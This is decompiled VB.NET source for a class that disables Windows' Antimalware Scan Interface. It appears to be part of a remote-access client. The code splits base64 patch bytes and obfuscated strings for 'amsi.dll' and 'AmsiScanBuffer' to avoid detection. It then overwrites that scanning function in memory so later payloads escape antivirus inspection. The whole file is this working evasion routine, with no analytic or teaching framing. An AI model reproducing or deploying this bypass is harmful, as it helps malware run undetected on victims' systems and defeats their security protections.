Imports System
Imports System.Runtime.InteropServices
Imports System.Text

Namespace Client.Connection
	' Token: 0x02000006 RID: 6
	Public Class Amsi
		' Token: 0x06000028 RID: 40 RVA: 0x000035BC File Offset: 0x000017BC
		Public Shared Sub Bypass()
			Dim text As String = "uFcA"
			text += "B4DD"
			Dim text2 As String = "uFcAB4"
			text2 += "DCGAA="
			If Amsi.is64Bit() Then
				Amsi.PatchA(Convert.FromBase64String(text))
				Return
			End If
			Amsi.PatchA(Convert.FromBase64String(text2))
		End Sub

		' Token: 0x06000029 RID: 41 RVA: 0x00003610 File Offset: 0x00001810
		Private Shared Sub PatchA(patch As Byte())
			Try
				Dim [string] As String = Encoding.[Default].GetString(Convert.FromBase64String("YW1zaS5kbGw="))
				Dim intPtr As IntPtr = Win32.LoadLibraryA([string])
				Dim string2 As String = Encoding.[Default].GetString(Convert.FromBase64String("QW1zaVNjYW5CdWZmZXI="))
				Dim procAddress As IntPtr = Win32.GetProcAddress(intPtr, string2)
				Dim num As UInteger
				Win32.VirtualAllocEx(procAddress, CType(CULng(CLng(patch.Length)), UIntPtr), 64UI, num)
				Marshal.Copy(patch, 0, procAddress, patch.Length)
			Catch ex As Exception
				Console.WriteLine(" [x] {0}", ex.Message)
				Console.WriteLine(" [x] {0}", ex.InnerException)
			End Try
		End Sub

		' Token: 0x0600002A RID: 42 RVA: 0x000036B8 File Offset: 0x000018B8
		Private Shared Function is64Bit() As Boolean
			Dim flag As Boolean = True
			If IntPtr.Size = 4 Then
				flag = False
			End If
			Return flag
		End Function
	End Class
End Namespace
